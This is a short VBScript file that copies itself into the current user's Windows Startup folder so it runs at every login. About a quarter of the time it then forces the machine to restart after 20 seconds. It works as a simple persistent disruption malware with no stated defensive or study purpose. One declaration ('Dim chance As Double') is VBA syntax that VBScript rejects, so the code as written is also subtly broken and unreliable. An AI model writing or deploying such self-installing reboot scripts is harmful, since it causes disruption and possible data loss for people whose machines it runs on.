Option Explicit

Dim objFSO, objShell, scriptPath, startupScriptPath
Dim userName

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

userName = objShell.ExpandEnvironmentStrings("%USERNAME%")
startupScriptPath = "C:\Users\" & userName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\MyScript.vbs"
scriptPath = WScript.ScriptFullName

If Not objFSO.FileExists(startupScriptPath) Then
    objFSO.CopyFile scriptPath, startupScriptPath
End If

Set objFSO = Nothing
Set objShell = Nothing

Sub RandomTask()
    Dim chance As Double
    Randomize  ' Initialize the random number generator
    chance = Rnd()  ' Generate a random number between 0 and 1

    If chance <= 0.25 Then
        Set objShell = WScript.CreateObject("WScript.Shell")
        objShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 20"
    Else
        
    End If
End Sub

RandomTask 
